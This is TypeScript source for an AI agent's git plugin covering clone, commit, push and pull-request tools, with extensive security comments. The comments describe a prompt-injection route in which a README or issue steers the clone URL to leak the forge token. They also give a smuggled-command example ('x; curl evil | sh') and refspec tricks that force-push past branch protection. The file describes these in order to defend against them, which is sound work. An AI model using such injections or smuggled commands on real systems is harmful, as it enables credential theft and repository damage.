import { tool } from "ai";
import type { ToolSet } from "ai";
import { z } from "zod";
import { definePlugin } from "@loopingai/core";
import type { AgentPlugin } from "@loopingai/core";

/**
 * `@loopingai/plugins/repo` — clone, commit, push, open a pull request.
 *
 * Layered over a container rather than owning one: it needs a shell with `git`
 * on it, and `@loopingai/plugins/computer` already provides exactly that through
 * `computerExec`. Passing `exec` in rather than importing that plugin keeps the
 * two independent — a host with its own container can use this against that
 * instead, and the tests here need no container at all.
 *
 * That seam has already paid for itself once: when the coder's substrate moved
 * from `@cloudflare/sandbox` to `@cloudflare/computer`, not a line of this file
 * changed except this comment.
 *
 * ## Where the token lives
 *
 * Nowhere the model or the container can read it, and nowhere it can be sent.
 * Three rules make that true, and all three are load-bearing:
 *
 * 1. **The token never appears in a command string.** It goes through `exec`'s
 *    per-command `env`, because a command line is echoed into stdout, into
 *    stderr on failure, into shell history, and into any VCR cassette a test
 *    records. `git` reads it back out of the environment through a credential
 *    helper that prints and exits.
 * 2. **The credential helper is scoped to the forge, and the forge is an
 *    allowlist.** This is the rule that is easy to miss and expensive to get
 *    wrong. A helper configured as plain `credential.helper` answers for *every
 *    host* — it never sees which one git is asking about — so a clone URL
 *    pointing anywhere makes git offer the token to that host the moment it
 *    replies `401`. And the clone URL is model input: a repository README, an
 *    issue body, or a page fetched by a co-installed browser plugin is enough to
 *    choose it. So the helper is bound to `credential.<origin>.helper`, and the
 *    URL's host must be on {@link RepoConfig.allowedHosts} before anything runs.
 * 3. **Pull requests are opened from the Worker, not the container.** The GitHub
 *    REST call happens on this side of the boundary, so the container never
 *    holds a credential that can act on the repository at all.
 *
 * The remaining exposure is deliberate and small: `git push` needs the token in
 * the container's process environment for the duration of one command, scoped to
 * one origin.
 */

/** This plugin's tool-family name, as a recipe's `toolFamilies` lists it. */
export const REPO_FAMILY = "repo";

/** Run one command in the host's container. Matches `computerExec`'s shape. */
export type RepoExec = (
  command: string,
  options?: {
    cwd?: string;
    env?: Record<string, string | undefined>;
    timeout?: number;
    /**
     * The executing subtask's runtime state, forwarded **opaquely**.
     *
     * This plugin never looks inside it. A delegated subtask has to reach the
     * container its parent prepared, and the key for that lives in the runtime
     * state the parent resolved — but decoding it is the container plugin's
     * business, not git's. Passing it through untouched is what lets the two
     * plugins compose
     * without either importing the other, which is the whole reason `exec` is
     * injected rather than imported.
     */
    runtime?: unknown;
  }
) => Promise<{
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}>;

export interface RepoConfig {
  /** Runs commands in the container holding the checkout. */
  exec: RepoExec;
  /**
   * A forge token with contents+pull-request write. A thunk so a rotated secret
   * is picked up without rebuilding the plugin list.
   */
  token: () => string;
  /** Where clones land. Defaults to `/workspace`. */
  workdir?: string;
  /** API origin, for GitHub Enterprise. Defaults to the public API. */
  apiBase?: string;
  /** Committer identity. Defaults to a generic agent identity. */
  author?: { name: string; email: string };
  /**
   * Hosts a clone may target, lowercase and exact. Defaults to `github.com`.
   *
   * A fail-closed allowlist rather than a blocklist, because the failure it
   * prevents is credential exfiltration and the input is model-chosen. Widen it
   * for GitHub Enterprise (alongside `apiBase`); an empty array clones nothing.
   */
  allowedHosts?: string[];
  /**
   * Ceiling on what any one tool here returns to the model. Defaults to 16,000
   * bytes, matching the computer plugin.
   *
   * This is not tidiness. `repo_diff` is the main input for an agent that
   * reviews rather than writes — a delegating coder whose subagents hold the
   * shell — and an unbounded diff on a large change is precisely the context
   * blowup that design exists to prevent.
   */
  maxOutputBytes?: number;
  /**
   * Called after a checkout is in place, freshly cloned or refreshed onto a new
   * commit.
   *
   * The hook exists because "there is now a working tree at this path" is
   * knowledge only this plugin has, and "that tree needs its dependencies
   * installed" is a decision only the host can make. Keeping the two apart is
   * what stops a git plugin growing an opinion about npm — the host wires this
   * to whatever its runtime does, or leaves it unset and nothing changes.
   *
   * Awaited, so it can record intent durably, but it must **return quickly**:
   * it runs inside `repo_clone`, which runs inside a model turn. A host that
   * wants to install here should start a job and return, not wait for it.
   *
   * A throw is caught and logged rather than failing the clone. The checkout did
   * succeed, the model needs to be told so, and a follow-up that did not is the
   * host's to notice.
   */
  afterCheckout?: (checkout: RepoCheckout) => Promise<void>;
  /**
   * Called with the repository a clone is *about* to target, after the host
   * allowlist has passed and before any git runs.
   *
   * Separate from {@link afterCheckout} because it answers a different question,
   * and the ordering is the whole point. A host that keys its container or its
   * filesystem per repository has to know which one **before** the clone, or the
   * clone lands somewhere it will then have to be moved from. `afterCheckout`
   * is far too late for that: by then the files exist.
   *
   * Synchronous on purpose. It runs on the path of every clone and the only
   * sensible thing to do with it is record a selection, which is why it returns
   * nothing and cannot be awaited — a host that needs to do I/O here has the
   * ordering wrong.
   */
  beforeCheckout?: (target: {
    url: string;
    host: string;
    owner: string;
    repo: string;
  }) => void;
}

/** What {@link RepoConfig.afterCheckout} is told about a checkout. */
export interface RepoCheckout {
  /** Absolute path of the working tree. */
  dir: string;
  /** The clone URL, already allowlist-checked. */
  url: string;
  /** Host it came from, lowercase. */
  host: string;
  /** `owner/repo`, when the URL parsed into one. */
  repo?: string;
  /** Branch the checkout is on. */
  branch: string;
  /** True for a first clone, false when an existing tree was refreshed. */
  fresh: boolean;
}

const DEFAULT_WORKDIR = "/workspace";
const DEFAULT_API_BASE = "https://api.github.com";
const DEFAULT_ALLOWED_HOSTS = ["github.com"];
const DEFAULT_AUTHOR = {
  name: "looping-coder",
  email: "coder@looping.invalid"
};
const DEFAULT_MAX_OUTPUT_BYTES = 16_000;

/**
 * Middle-out truncation, so both the head of a diff and its tail survive.
 *
 * Deliberately a **copy** of the computer plugin's function of the same name,
 * not an import. `npm run verify:exports` fails any subpath whose module graph
 * reaches a sibling's directory, and its own advice for a shared helper is to
 * duplicate it — installing `repo` must not drag `computer` (and therefore
 * `@cloudflare/computer`) into a consumer's bundle. Fifteen lines is a cheaper
 * price than that coupling, and it is the same reason `exec` is injected here
 * rather than imported.
 *
 * The `half < 1` guard is not padding: without it a small `max` makes `half`
 * zero or negative, and `slice(-0)` is `slice(0)` — the whole string — so the
 * function would return *more* than it was given.
 */
export function truncateOutput(text: string, max: number): string {
  if (text.length <= max) return text;

  const marker = (dropped: number) =>
    `\n\n… [${dropped} characters omitted from the middle] …\n\n`;

  const half = Math.floor((max - marker(text.length).length) / 2);
  if (half < 1) return text.slice(0, Math.max(0, max));

  return (
    text.slice(0, half) + marker(text.length - half * 2) + text.slice(-half)
  );
}

/**
 * A credential helper that prints the token from the environment and exits.
 *
 * This is what keeps the secret off the command line. `git` invokes the helper,
 * the helper reads `$REPO_TOKEN` out of its own environment, and the token never
 * becomes an argument that something could log. The alternative everyone reaches
 * for first — embedding it in the remote URL — writes it into `.git/config`,
 * where it stays after the command finishes.
 *
 * Note what the helper does **not** do: read git's stdin, where the protocol
 * says which host is being asked about. It answers unconditionally, so it must
 * never be installed unconditionally — see {@link credentialConfig}.
 */
const CREDENTIAL_HELPER =
  "!f() { echo username=x-access-token; echo password=$REPO_TOKEN; }; f";

/**
 * Bind the helper to one origin.
 *
 * `credential.helper` applies to every host git ever authenticates to; with a
 * helper that ignores its input, that means the token is offered to any server
 * that asks for auth. `credential.<origin>.helper` applies only to URLs under
 * that origin, so a clone pointed elsewhere gets no credential at all — the
 * request fails instead of leaking.
 *
 * Verified against real git: with the unscoped form,
 * `git credential fill` for `host=evil.example.com` printed the token.
 */
function credentialConfig(host: string): string {
  return `credential.https://${host}.helper='${CREDENTIAL_HELPER}'`;
}

/** Branch names a push must never target, whatever the model believes. */
const PROTECTED_BRANCHES = new Set(["main", "master", "trunk", "develop"]);

/**
 * A branch name git would accept but this plugin must not, because it can
 * resolve to something other than the branch it appears to name.
 *
 * `git push origin <name>` treats `<name>` as a refspec, so a `:` makes it
 * `<src>:<dst>` and a leading `+` makes it a force push — either one steps
 * around {@link PROTECTED_BRANCHES}, which only ever sees the literal string.
 * `git checkout -B` happens to reject some of these already; "happens to" is not
 * a guarantee worth depending on.
 */
const UNSAFE_BRANCH =
  /[:^~?*[\\\x00-\x20\x7f]|^[+-]|^refs\/|\.\.|@\{|\.lock$|\/$/;

/** Where a repository URL points, in a form that cannot be spoofed by a path. */
function repoLocation(url: string): { host: string; path: string } | undefined {
  // `git@github.com:owner/repo.git` — scp-like syntax, which `new URL` rejects.
  const scp = /^[A-Za-z0-9._-]+@([A-Za-z0-9.-]+):(.+)$/.exec(url.trim());
  if (scp) return { host: scp[1]!.toLowerCase(), path: scp[2]! };

  try {
    const parsed = new URL(url.trim());
    // https only. Not pedantry: git accepts `ext::<command>`, `file://` and
    // more, and `ext::` in particular runs an arbitrary command as a "remote".
    if (parsed.protocol !== "https:") return undefined;
    return { host: parsed.hostname.toLowerCase(), path: parsed.pathname };
  } catch {
    return undefined;
  }
}

/**
 * `owner/repo` out of a GitHub URL, or `undefined` if it is not one.
 *
 * Anchored on the parsed **host**, which the previous unanchored regex was not:
 * `github.com` appearing anywhere in the string was enough, so
 * `https://evil.example.com/github.com/owner/repo` parsed as that owner and
 * repo. Nothing gated on this at the time, which is exactly why it was worth
 * fixing before something did.
 */
export function parseRepo(
  url: string,
  allowedHosts: readonly string[] = DEFAULT_ALLOWED_HOSTS
): { owner: string; repo: string } | undefined {
  const location = repoLocation(url);
  if (!location || !allowedHosts.includes(location.host)) return undefined;

  const match = /^\/?([^/]+)\/([^/]+?)(?:\.git)?\/?$/.exec(location.path);
  if (!match) return undefined;
  return { owner: match[1]!, repo: match[2]! };
}

/**
 * What a refresh did, split from what the model is told about it.
 *
 * `branch` is set only when this call left a clean tree on a known branch —
 * which is also the only case where `afterCheckout` should fire. Every early
 * return here is a reason *not* to act on the checkout, and returning a bare
 * string made those indistinguishable from success at the call site.
 */
interface RefreshOutcome {
  message: string;
  branch?: string;
}

/** The two runners `refreshCheckout` borrows from {@link buildRepoTools}. */
interface GitRunners {
  plain: (
    args: string,
    cwd: string,
    vars?: Record<string, string>
  ) => Promise<{ success: boolean; stdout: string; stderr: string }>;
  git: (
    host: string,
    args: string,
    cwd: string,
    vars?: Record<string, string>
  ) => Promise<{ success: boolean; stdout: string; stderr: string }>;
}

/**
 * Bring an existing checkout back to a clean, current state.
 *
 * `repo_clone` used to assume an empty directory, which stopped being true the
 * moment containers outlived a task: `git clone` fails outright with
 * "destination path already exists and is not an empty directory", and the round
 * has to improvise from an error that reads like a bug.
 *
 * The refusal on a dirty tree is the important half. Uncommitted changes there
 * are a *previous task's work* — possibly the thing a human is waiting on — and
 * silently `reset --hard`ing them away to make a fresh clone look clean is the
 * one outcome nobody could recover from. Refusing costs a round; discarding
 * costs the work.
 */
async function refreshCheckout({
  dir,
  url,
  branch,
  host,
  plain,
  git
}: GitRunners & {
  dir: string;
  url: string;
  branch: string | undefined;
  host: string;
}): Promise<RefreshOutcome> {
  const remote = await plain("remote get-url origin", dir);
  if (remote.stdout.trim() !== url.trim()) {
    return {
      message:
        `${dir} already holds a checkout of ${remote.stdout.trim() || "another repository"}, ` +
        `not ${url}. Pick a different directory or work with the checkout that is there.`
    };
  }

  const dirty = await plain("status --porcelain", dir);
  if (dirty.stdout.trim()) {
    // Deliberately no `branch` here, so no `afterCheckout` fires. The tree is
    // usable, but it is somebody's unfinished work rather than a checkout this
    // call established — kicking off an install over it would be acting on a
    // state the model has not looked at yet.
    return {
      message:
        `${dir} already has this repository checked out, with uncommitted changes:\n` +
        `${dirty.stdout.trim()}\n\n` +
        `Left untouched — these may be unfinished work from an earlier task. ` +
        `Inspect them with repo_diff, then either build on them or commit them. ` +
        `Nothing was fetched or reset.`
    };
  }

  const fetched = await git(host, "fetch --prune origin", dir);
  if (!fetched.success)
    return { message: `fetch failed: ${fetched.stderr || fetched.stdout}` };

  // The branch to land on: the one asked for, else the remote's own default.
  let target = branch;
  if (!target) {
    const head = await plain(
      "symbolic-ref --short refs/remotes/origin/HEAD",
      dir
    );
    target = head.success
      ? head.stdout.trim().replace(/^origin\//, "")
      : undefined;
  }
  if (!target)
    return { message: `could not determine a default branch for ${url}` };

  const checkout = await plain(`checkout "$REPO_BRANCH"`, dir, {
    REPO_BRANCH: target
  });
  if (!checkout.success)
    return {
      message: `could not check out ${target}: ${checkout.stderr || checkout.stdout}`
    };

  const reset = await plain(`reset --hard "origin/$REPO_BRANCH"`, dir, {
    REPO_BRANCH: target
  });
  if (!reset.success)
    return {
      message: `could not reset to origin/${target}: ${reset.stderr || reset.stdout}`
    };

  return {
    message: `reused the existing checkout at ${dir}, fetched and reset to origin/${target}`,
    branch: target
  };
}

export function buildRepoTools(
  config: RepoConfig,
  /** Forwarded to every `exec`; see {@link RepoExec}'s `runtime` option. */
  runtime?: unknown
): ToolSet {
  const workdir = config.workdir ?? DEFAULT_WORKDIR;
  const apiBase = config.apiBase ?? DEFAULT_API_BASE;
  const author = config.author ?? DEFAULT_AUTHOR;
  const allowedHosts = config.allowedHosts ?? DEFAULT_ALLOWED_HOSTS;
  const maxBytes = config.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES;

  /** Everything this plugin hands back to the model, bounded. */
  const bounded = (text: string) => truncateOutput(text, maxBytes);

  /**
   * Tell the host a checkout is ready, and never let that fail the clone.
   *
   * The clone did succeed. Whatever the host wanted to do next — start an
   * install, usually — is its problem to notice, and turning a working
   * `repo_clone` into an error would send the model to investigate git when
   * git is fine.
   */
  const notifyCheckout = async (checkout: RepoCheckout): Promise<void> => {
    if (!config.afterCheckout) return;
    try {
      await config.afterCheckout(checkout);
    } catch (err) {
      console.error("[repo] afterCheckout failed", {
        dir: checkout.dir,
        repo: checkout.repo,
        err: String(err)
      });
    }
  };

  /**
   * Say out loud that a git command failed.
   *
   * Every failure path here returns its stderr *to the model* and logged
   * nothing, which is exactly one audience short. When a push started failing
   * in production the only trace was an `exec` line with `exitCode: 128`
   * and a truncated command — diagnosing it meant correlating exit codes
   * against the GitHub API to prove the branch never landed. One line naming
   * the tool and carrying the stderr answers it directly.
   *
   * The token is scrubbed rather than trusted. It never reaches a command line
   * and the credential helper prints only to git's stdin, so stderr should be
   * clean — but "should be" is not the standard for something that writes a
   * credential into a log that outlives the request.
   */
  const logFailure = (
    tool: string,
    detail: { exitCode?: number; stderr?: string; stdout?: string }
  ): void => {
    const token = config.token();
    const scrub = (text: string | undefined) =>
      token && text ? text.split(token).join("«token»") : text;
    console.warn(`[repo] ${tool} failed`, {
      exitCode: detail.exitCode,
      stderr: truncateOutput(scrub(detail.stderr) ?? "", 2_000),
      stdout: truncateOutput(scrub(detail.stdout) ?? "", 2_000)
    });
  };

  /**
   * One git command at a time, per checkout.
   *
   * Git takes `.git/index.lock` for anything that writes, and fails outright
   * rather than waiting if it is already held. Nothing stopped two of these tools
   * running at once — a model may emit several tool calls in a single turn, and
   * the SDK executes them concurrently — so a `repo_commit` and a `repo_push`
   * issued together raced, and production returned:
   *
   *     fatal: Unable to create '…/.git/index.lock': File exists.
   *     Another git process seems to be running in this repository
   *
   * The commit failed, the push succeeded against the *previous* state, and the
   * model had to work out what had actually landed. A lost commit is the good
   * outcome there; the bad one is a push that looks like it worked.
   *
   * A promise chain rather than a real lock, because that is all the scope needs:
   * the racers are tool calls inside one turn, in one isolate, against one
   * container. It is also deliberately **not** module-level — two agents working
   * on two checkouts have no reason to queue behind each other.
   *
   * Reads are serialised too. `git status` does not take the lock, but ordering
   * them costs nothing on operations measured in tens of milliseconds and removes
   * having to be right about which commands write.
   */
  let gitQueue: Promise<unknown> = Promise.resolve();
  const serialised = <T>(run: () => Promise<T>): Promise<T> => {
    // `then(run, run)` so one failure does not wedge every command behind it —
    // the queue is for ordering, not for propagating outcomes.
    const next = gitQueue.then(run, run);
    gitQueue = next.then(
      () => undefined,
      () => undefined
    );
    return next;
  };

  /**
   * Run git with the token in the environment, never on the command line, and
   * offered only to `host`.
   *
   * `vars` carries every **model-controlled** value — a URL, a branch name, a
   * commit message — into the container as an environment variable, referenced
   * inside the command as `"$VAR"`. Interpolating them into the command string
   * instead would let a model-authored branch name of `x; curl evil | sh` run
   * as a second command. The container is isolated and the blast radius is its
   * own filesystem, but "the container contains it" is a reason to be careful
   * here, not a reason to skip it.
   *
   * `host` is never model input: it comes from {@link repoLocation} after the
   * allowlist check, so the origin the credential is bound to is always one the
   * host configured.
   */
  const git = (
    host: string,
    args: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) =>
    serialised(() =>
      config.exec(`git -c ${credentialConfig(host)} ${args}`, {
        cwd,
        runtime,
        env: {
          REPO_TOKEN: config.token(),
          // A credential miss must fail, not block forever on a prompt nobody is
          // there to answer. A hang is worse than an error: it burns the round.
          GIT_TERMINAL_PROMPT: "0",
          ...vars
        }
      })
    );

  const plain = (
    args: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) =>
    serialised(() =>
      config.exec(`git ${args}`, {
        cwd,
        runtime,
        env: { GIT_TERMINAL_PROMPT: "0", ...vars }
      })
    );

  /**
   * The origin a checkout was cloned from, re-derived rather than remembered.
   *
   * `repo_push` needs to know which host to offer the credential to, and the
   * only trustworthy answer is the one recorded in the checkout itself — which
   * `repo_clone` only ever writes after the allowlist has passed.
   */
  const originHost = async (dir: string): Promise<string | undefined> => {
    const remote = await plain("remote get-url origin", dir);
    if (!remote.success) return undefined;
    const location = repoLocation(remote.stdout.trim());
    if (!location || !allowedHosts.includes(location.host)) return undefined;
    return location.host;
  };

  return {
    repo_clone: tool({
      description:
        "Clone a git repository into the workspace. Returns the checkout path and the branch you landed on. If the repository is already checked out from an earlier task, it is fetched and reset to the remote instead — unless it has uncommitted changes, which are left alone for you to inspect.",
      inputSchema: z.object({
        url: z.string().describe("HTTPS repository URL"),
        branch: z
          .string()
          .optional()
          .describe("Branch to check out (default: the repo's default)"),
        depth: z
          .number()
          .optional()
          .describe(
            "Shallow-clone depth. Omit for full history; needed if you must rebase."
          )
      }),
      execute: async ({ url, branch, depth }) => {
        // The gate, before anything runs. `url` is model input, and a clone is
        // the one command that hands a credential to a host it names.
        const location = repoLocation(url);
        if (!location || !allowedHosts.includes(location.host)) {
          return (
            `refusing to clone from "${location?.host ?? url}" — this agent may ` +
            `only clone over https from: ${allowedHosts.join(", ")}`
          );
        }
        const { host } = location;

        const parsed = parseRepo(url, allowedHosts);
        const dir = `${workdir}/${parsed?.repo ?? "repo"}`;

        // Before anything runs, and before `dir` is touched: a host keying its
        // filesystem per repository needs to have switched by now. See
        // `beforeCheckout` for why this cannot wait for the clone to finish.
        if (parsed) {
          config.beforeCheckout?.({
            url,
            host,
            owner: parsed.owner,
            repo: parsed.repo
          });
        }

        // The workspace outlives the task, so this path may already hold the
        // checkout a previous task left — see `refreshCheckout`.
        const existing = await plain("rev-parse --git-dir", dir);
        if (existing.success) {
          const refreshed = await refreshCheckout({
            dir,
            url,
            branch,
            host,
            plain,
            git
          });
          if (refreshed.branch) {
            await notifyCheckout({
              dir,
              url,
              host,
              ...(parsed ? { repo: `${parsed.owner}/${parsed.repo}` } : {}),
              branch: refreshed.branch,
              fresh: false
            });
          }
          return refreshed.message;
        }

        // `depth` is a number from the schema, so it cannot carry shell syntax.
        const flags = [
          depth ? `--depth ${Math.max(1, Math.floor(depth))}` : "",
          branch ? `--branch "$REPO_BRANCH"` : ""
        ]
          .filter(Boolean)
          .join(" ");
        const result = await git(
          host,
          `clone ${flags} "$REPO_URL" "$REPO_DIR"`,
          workdir,
          {
            REPO_URL: url,
            REPO_DIR: dir,
            ...(branch ? { REPO_BRANCH: branch } : {})
          }
        );
        if (!result.success) {
          logFailure("repo_clone", result);
          return bounded(`clone failed: ${result.stderr || result.stdout}`);
        }

        // Identity has to exist before the first commit, and a repo-local config
        // keeps it from leaking into anything else in the container.
        await plain(`config user.name "$GIT_NAME"`, dir, {
          GIT_NAME: author.name
        });
        await plain(`config user.email "$GIT_EMAIL"`, dir, {
          GIT_EMAIL: author.email
        });

        const head = await plain("rev-parse --abbrev-ref HEAD", dir);
        const landed = head.stdout.trim();
        await notifyCheckout({
          dir,
          url,
          host,
          ...(parsed ? { repo: `${parsed.owner}/${parsed.repo}` } : {}),
          branch: landed,
          fresh: true
        });
        return `cloned to ${dir} on branch ${landed}`;
      }
    }),

    repo_status: tool({
      description: "Show which files changed in the checkout.",
      inputSchema: z.object({ dir: z.string().describe("Checkout directory") }),
      execute: async ({ dir }) => {
        const result = await plain("status --short", dir);
        return bounded(result.stdout.trim()) || "(no changes)";
      }
    }),

    repo_diff: tool({
      description:
        "Show the current diff. Read this before committing — it is the cheapest way to catch an edit that did more than you intended. Pass stat:true first on a large change to see which files moved and by how much, then read the full diff of what matters.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        staged: z.boolean().optional().describe("Show staged changes instead"),
        stat: z
          .boolean()
          .optional()
          .describe(
            "Summarise as a per-file changed-line count instead of the full patch"
          )
      }),
      execute: async ({ dir, staged, stat }) => {
        const flags = [staged ? "--staged" : "", stat ? "--stat" : ""]
          .filter(Boolean)
          .join(" ");
        const result = await plain(`diff ${flags}`, dir);
        // Truncated from the middle rather than the end: the head of a diff and
        // its tail are both informative, and the middle of a large one rarely
        // is. A model that needs the part that was dropped can ask for `stat`
        // and then read the file.
        return bounded(result.stdout.trim()) || "(no diff)";
      }
    }),

    repo_commit: tool({
      description:
        "Stage everything and commit. Write the message for a reviewer reading it in the log a year from now: what changed and why, not how.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        message: z.string().describe("Commit message")
      }),
      execute: async ({ dir, message }) => {
        await plain("add -A", dir);
        // The message is model-authored free text — quotes, backticks, newlines,
        // `$(…)`. Expanded from the environment inside the container, all of
        // that is inert; interpolated into the command string, none of it is.
        const result = await plain(`commit -m "$GIT_COMMIT_MESSAGE"`, dir, {
          GIT_COMMIT_MESSAGE: message
        });
        if (!result.success && /nothing to commit/i.test(result.stdout))
          return "nothing to commit — the working tree is clean";
        if (!result.success) {
          logFailure("repo_commit", result);
          return bounded(`commit failed: ${result.stderr || result.stdout}`);
        }
        return bounded(result.stdout.trim());
      }
    }),

    repo_push: tool({
      description:
        "Push a branch to the remote. Refuses to push to a protected branch and refuses to force-push — open a pull request instead.",
      inputSchema: z.object({
        dir: z.string().describe("Checkout directory"),
        branch: z
          .string()
          .describe(
            "Branch name to create and push, e.g. 'coder/add-json-flag'"
          )
      }),
      execute: async ({ dir, branch }) => {
        // Enforced here rather than in the prompt: a guardrail a model can talk
        // itself out of is not a guardrail.
        //
        // Shape first, then the name. `git push origin <name>` reads `<name>`
        // as a refspec, so `+x:main` is a force push to main that the name
        // check below would wave through — it only ever sees a literal string.
        if (UNSAFE_BRANCH.test(branch))
          return `"${branch}" is not a plain branch name — use something like "coder/add-json-flag"`;
        if (PROTECTED_BRANCHES.has(branch))
          return `refusing to push to "${branch}" — push a work branch and open a pull request`;

        // The repository's *own* default, which is often none of the four names
        // above: a repo whose trunk is `release` deserves the same protection.
        const head = await plain(
          "symbolic-ref --short refs/remotes/origin/HEAD",
          dir
        );
        const defaultBranch = head.success
          ? head.stdout.trim().replace(/^origin\//, "")
          : undefined;
        if (defaultBranch && defaultBranch === branch)
          return `refusing to push to "${branch}" — it is this repository's default branch; push a work branch and open a pull request`;

        const host = await originHost(dir);
        if (!host)
          return `${dir} has no origin on an allowed host — clone it with repo_clone first`;

        // Switch to the branch, or create it — but never *reset* it.
        //
        // This was `checkout -B`, which is create-or-reset, and the difference
        // destroyed real work. The sequence that did it, verbatim from a
        // production run: the model committed on the default branch, ran
        // `git branch coder/x` to save the commit, then `git checkout main &&
        // git reset --hard origin/main` to tidy up. `checkout -B coder/x` then
        // force-moved the branch it had just made back to `origin/main`, so the
        // commit existed only as an unreferenced object. Had the credential been
        // working, this would have pushed an empty branch and opened a pull
        // request on it — a silent, complete loss dressed up as success.
        const exists = await plain(
          `rev-parse --verify --quiet "refs/heads/$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        const checkout = await plain(
          exists.success
            ? `checkout "$REPO_BRANCH"`
            : `checkout -b "$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!checkout.success) {
          logFailure("repo_push", checkout);
          return bounded(
            `could not switch to branch "${branch}": ${checkout.stderr || checkout.stdout}`
          );
        }

        // Nothing to push is a bug upstream of here, not a no-op.
        //
        // A branch level with the default branch means the commit went
        // somewhere else, or was never made. Pushing it succeeds, `repo_open_pr`
        // opens an empty pull request, and the round reports a URL as if the
        // work had landed — the one outcome worse than an error. Skipped rather
        // than failed when the baseline cannot be resolved: a repository with no
        // `origin/HEAD` is unusual but legitimate, and guessing is worse than
        // not guarding.
        if (defaultBranch) {
          const ahead = await plain(
            `rev-list --count "origin/$REPO_BASE..HEAD"`,
            dir,
            {
              REPO_BASE: defaultBranch
            }
          );
          if (ahead.success && ahead.stdout.trim() === "0") {
            return (
              `refusing to push "${branch}" — it has no commits that origin/${defaultBranch} ` +
              `does not already have, so the pull request would be empty. Check repo_status ` +
              `and repo_diff: either the change was never committed, or it was committed on ` +
              `a different branch.`
            );
          }
        }

        const result = await git(
          host,
          `push --set-upstream origin "$REPO_BRANCH"`,
          dir,
          { REPO_BRANCH: branch }
        );
        if (!result.success) {
          logFailure("repo_push", result);
          return bounded(`push failed: ${result.stderr || result.stdout}`);
        }
        return `pushed ${branch}`;
      }
    }),

    repo_open_pr: tool({
      description:
        "Open a pull request for a pushed branch and return its URL. Do this once the branch is pushed and the tests pass.",
      inputSchema: z.object({
        url: z.string().describe("The repository URL the branch was pushed to"),
        head: z.string().describe("The branch you pushed"),
        base: z.string().describe("The branch to merge into, e.g. 'main'"),
        title: z.string().describe("Pull request title"),
        body: z
          .string()
          .describe(
            "Pull request description — what changed and why, and how you verified it"
          )
      }),
      execute: async ({ url, head, base, title, body }) => {
        const parsed = parseRepo(url, allowedHosts);
        if (!parsed)
          return `could not parse an owner/repo out of ${url} on an allowed host`;

        // Encoded, not interpolated raw. These come from a model-supplied URL,
        // and an owner containing `?` or `#` would otherwise re-point the
        // request at a different endpoint on the same API.
        const owner = encodeURIComponent(parsed.owner);
        const repo = encodeURIComponent(parsed.repo);

        // Deliberately from the Worker, not the container: this is the only
        // credential that can write to the repository through the API, and it
        // never crosses into the container.
        const response = await fetch(
          `${apiBase}/repos/${owner}/${repo}/pulls`,
          {
            method: "POST",
            headers: {
              authorization: `Bearer ${config.token()}`,
              accept: "application/vnd.github+json",
              "content-type": "application/json",
              "user-agent": "looping-coder"
            },
            body: JSON.stringify({ title, head, base, body })
          }
        );

        if (!response.ok) {
          const detail = await response.text();
          logFailure("repo_open_pr", {
            exitCode: response.status,
            stderr: detail
          });
          return `could not open the pull request (${response.status}): ${detail.slice(0, 500)}`;
        }
        const pr = (await response.json()) as { html_url?: string };
        return (
          pr.html_url ?? "pull request opened, but the response carried no URL"
        );
      }
    })
  };
}

export function repo(config: RepoConfig): AgentPlugin {
  return definePlugin({
    key: "repo",

    mainAgentTools: () => buildRepoTools(config),

    // The runtime state goes through to `exec` untouched, so a delegated
    // subtask's git commands run in the same container its parent cloned into.
    toolFamilies: {
      [REPO_FAMILY]: (ctx) => ({ tools: buildRepoTools(config, ctx.runtime) })
    },

    capability: [
      "You can work with git repositories:",
      "- `repo_clone` checks one out into the workspace. The checkout may already be there from an earlier task, in which case it is fetched and reset for you — but if it has uncommitted changes it is left as-is, and you should read them with `repo_diff` before deciding what to do.",
      "- `repo_status` and `repo_diff` show what you have changed — read the diff before committing. On a large change call `repo_diff` with `stat: true` first to see which files moved, then read the ones that matter; output is truncated from the middle when it is large.",
      "- `repo_commit` stages everything and commits.",
      "- `repo_push` pushes a work branch. It refuses the default branch and other protected names, and it refuses a branch carrying no commits the default branch does not already have — that is not negotiable.",
      "- `repo_open_pr` opens the pull request and returns its URL.",
      "Never push to the default branch. Finish by opening a pull request and reporting its URL."
    ].join("\n"),

    requires: { secrets: ["GITHUB_TOKEN"] }
  });
}
